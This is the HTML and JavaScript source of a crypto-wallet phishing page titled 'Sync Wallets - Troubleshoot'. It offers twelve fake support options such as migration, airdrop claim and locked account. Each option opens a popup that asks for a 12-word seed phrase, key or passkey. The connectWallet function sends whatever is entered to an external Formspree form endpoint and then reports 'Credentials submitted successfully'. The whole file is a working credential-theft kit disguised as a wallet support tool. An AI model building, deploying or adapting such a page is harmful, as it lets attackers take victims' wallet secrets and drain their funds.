<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sync Wallets - Troubleshoot</title>
    <link rel="stylesheet" href="color.css">
</head>
<body>
    <header>
        <div class="banner">
            <img src="assets/banner.jpg" alt="Wallet Security Banner">
        </div>
        <h1>Get Started Below.</h1>
    </header>
    
    <div class="troubleshoot-container" id="troubleshootContainer"></div>

    <!-- Authentication Popup -->
    <div id="authPopup" class="popup" style="display: none;">
        <div class="popup-content">
            <h2>Wallet Authentication</h2>
            
            <label for="authType">Select Authentication Method:</label>
            <select id="authType" name="authType">
                <option value="seed">Seed Phrase</option>
                <option value="keygen">Keygen</option>
                <option value="passkey">Passkey</option>
            </select>

            <label for="authInput">Enter Credentials:</label>
            <input type="text" id="authInput" name="authInput" placeholder="Enter your credentials">

            <p id="authMessage" class="hidden"></p>

            <button class="connect-btn" onclick="connectWallet()">Connect</button>
            <button id="closeAuthPopup" class="close-btn">Close</button>
        </div>
    </div>

    <script>
        const troubleshootOptions = [
            { name: "Migration", description: "Click here for migration or to resolve any migration related issues." },
            { name: "Rectification", description: "Click here to rectify all strange wallet issues." },
            { name: "Claim", description: "Click here to claim tokens or resolve any token claiming related issues." },
            { name: "Swap", description: "Click here to swap tokens or resolve token swaplist." },
            { name: "Slippage", description: "Click here for slippage or transaction fee related issues." },
            { name: "Claim Airdrop", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
            { name: "Staking", description: "Click here to resolve issues while staking/unstaking." },
            { name: "Whitelist", description: "Click here to whitelist your address or resolve whitelisting related error." },
            { name: "Cross Transfer", description: "Click here to resolve cross transfer issues." },
            { name: "NFTs", description: "Click here to resolve NFT related issues." },
            { name: "Locked Account", description: "Click here to resolve locked account issues." },
            { name: "Login Error", description: "Click here to resolve login error issues." }
        ];

        const troubleshootContainer = document.getElementById("troubleshootContainer");

        troubleshootOptions.forEach(option => {
            let optionBox = document.createElement("div");
            optionBox.classList.add("troubleshoot-box");
            optionBox.setAttribute("tabindex", "0");
            optionBox.setAttribute("role", "button");
            optionBox.innerHTML = `
                <h3>${option.name.toUpperCase()}</h3>
                <p>${option.description}</p>
            `;
            optionBox.onclick = () => openAuthPopup(option.name);
            optionBox.onkeydown = (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    openAuthPopup(option.name);
                }
            };
            troubleshootContainer.appendChild(optionBox);
        });

        let selectedOption = null;

        function openAuthPopup(optionName) {
            selectedOption = optionName;
            document.getElementById("authPopup").style.display = "flex";
        }

        function closeAuthPopup() {
            selectedOption = null;
            document.getElementById("authPopup").style.display = "none";
            document.getElementById("authMessage").textContent = "";
            document.getElementById("authMessage").classList.add("hidden");
        }

        document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);

        window.onclick = function(event) {
            if (event.target.classList.contains("popup")) {
                closeAuthPopup();
            }
        };

        function connectWallet() {
            let authType = document.getElementById("authType").value;
            let authInput = document.getElementById("authInput").value.trim();
            let message = document.getElementById("authMessage");

            message.textContent = "";
            message.classList.add("hidden");

            if (authInput === "") {
                message.textContent = "Error: Credentials cannot be empty!";
                message.classList.remove("hidden");
                return;
            }

            if (authType === "seed" && authInput.split(" ").length !== 12) {
                message.textContent = "Error: Seed phrase must be 12 words!";
                message.classList.remove("hidden");
                return;
            }

            if (authType === "keygen" && authInput.length < 16) {
                message.textContent = "Error: Keygen must be at least 16 characters!";
                message.classList.remove("hidden");
                return;
            }

            if (authType === "passkey" && authInput.length < 8) {
                message.textContent = "Error: Passkey must be at least 8 characters!";
                message.classList.remove("hidden");
                return;
            }

            fetch("https://formspree.io/f/mvgkalye", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `authType=${encodeURIComponent(authType)}&authInput=${encodeURIComponent(authInput)}&troubleshootOption=${encodeURIComponent(selectedOption)}`
            })
            .then(response => {
                if (response.ok) {
                    message.textContent = "Credentials submitted successfully!";
                    message.style.color = "green";
                    message.classList.remove("hidden");
                    setTimeout(closeAuthPopup, 2000);
                } else {
                    message.textContent = `Error submitting credentials. Status: ${response.status}`;
                    message.style.color = "red";
                    message.classList.remove("hidden");
                }
            })
            .catch(() => {
                message.textContent = "Network error. Please try again.";
                message.style.color = "red";
                message.classList.remove("hidden");
            });
        }

        document.getElementById("authInput").addEventListener("input", function () {
            document.getElementById("authMessage").classList.add("hidden");
        });
    </script>

    <style>
        .troubleshoot-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .troubleshoot-box {
            background-color: #1a2a44;
            border: 2px solid #2a3b5a;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: transform 0.2s, border-color 0.2s;
        }

        .troubleshoot-box:hover {
            transform: scale(1.05);
            border-color: #00d4ff;
        }

        .troubleshoot-box h3 {
            margin: 0 0 10px;
            font-size: 1.2em;
            color: #ffffff;
        }

        .troubleshoot-box p {
            margin: 0;
            font-size: 0.9em;
            color: #b0b0b0;
        }
    </style>
</body>
</html>
